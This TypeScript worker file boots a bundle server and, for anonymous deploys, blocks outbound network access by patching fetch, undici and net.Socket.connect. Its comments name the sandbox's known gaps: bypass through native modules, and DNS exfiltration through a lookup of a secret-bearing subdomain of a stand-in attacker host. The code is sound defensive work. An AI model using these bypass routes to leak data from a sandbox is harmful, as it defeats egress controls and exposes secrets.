import { serveBundleServer } from "../start-server.js"

interface BootOptions {
  bundlePath: string
  clientPath?: string
  cwd: string
  port: number
  hostname?: string
  inspectSecret?: string
  publicInspect?: boolean
  allowedOrigins?: string[]
  restrictNetwork?: boolean
}

type ParentMessage = { type: "boot"; options: BootOptions } | { type: "shutdown" }

let server: { close: (cb?: (err?: Error) => void) => void } | null = null

function send(msg: object) {
  if (process.send) process.send(msg)
}

async function installNetworkRestriction() {
  const denyMsg = "Outbound network access disabled for anonymous deploys"
  const denyFetch = () => {
    throw new Error(denyMsg)
  }
  ;(globalThis as any).fetch = denyFetch
  try {
    // undici may not be installed and has no bundled types here; use a
    // string-built specifier so tsc doesn't try to resolve it.
    const specifier = "undici"
    const undici = (await import(specifier)) as { fetch?: unknown }
    if (undici && typeof undici === "object") (undici as { fetch?: unknown }).fetch = denyFetch
  } catch {
    // undici may not be installed; best-effort
  }
  // Patch net.Socket.prototype.connect — blocks node:http, node:https, tls.connect,
  // and any direct net.Socket usage. This isn't airtight (a determined capsule could
  // load a native module that bypasses the JS layer), but it raises the bar from
  // "one line of node:https" to "you have to ship native code."
  try {
    const net = await import("node:net")
    net.Socket.prototype.connect = function (...args: unknown[]) {
      const a0 = args[0]
      let host = ""
      let port: number | string = ""
      if (typeof a0 === "object" && a0 !== null) {
        const obj = a0 as { path?: unknown; host?: unknown; address?: unknown; port?: unknown }
        if (typeof obj.path === "string") {
          throw new Error(`${denyMsg} (unix socket: ${obj.path})`)
        }
        host = String(obj.host ?? obj.address ?? "")
        port = typeof obj.port === "number" || typeof obj.port === "string" ? obj.port : ""
      } else if (typeof a0 === "number" || typeof a0 === "string") {
        port = a0
        if (typeof args[1] === "string") host = args[1]
      }
      throw new Error(`${denyMsg} (attempted connect to ${host || "<unspecified>"}:${port})`)
    }
  } catch {
    // node:net should always be available; best-effort
  }
  // Note on DNS: a capsule can still leak data via dns.lookup("<secret>.attacker.example.com")
  // even with net.Socket.connect blocked, because the resolver query leaves the host
  // before any TCP connect. JS-level patching of node:dns is unreliable across Node
  // versions and under --experimental-permission, so DNS exfiltration must be closed
  // at the OS layer (cgroups, network namespaces, egress firewall). This is a known
  // gap of the JS-only sandbox.
}

process.on("message", async (msg: ParentMessage) => {
  if (msg.type === "boot") {
    try {
      if (msg.options.restrictNetwork) {
        await installNetworkRestriction()
      }
      const result = await serveBundleServer(msg.options)
      server = result.server
      send({ type: "booted", port: result.port })
    } catch (err: any) {
      send({ type: "error", message: err?.message ?? String(err) })
      process.exit(1)
    }
  } else if (msg.type === "shutdown") {
    if (!server) {
      send({ type: "closed" })
      process.exit(0)
    }
    await new Promise<void>((resolve) => server!.close(() => resolve()))
    send({ type: "closed" })
    process.exit(0)
  }
})

process.on("disconnect", () => {
  process.exit(0)
})
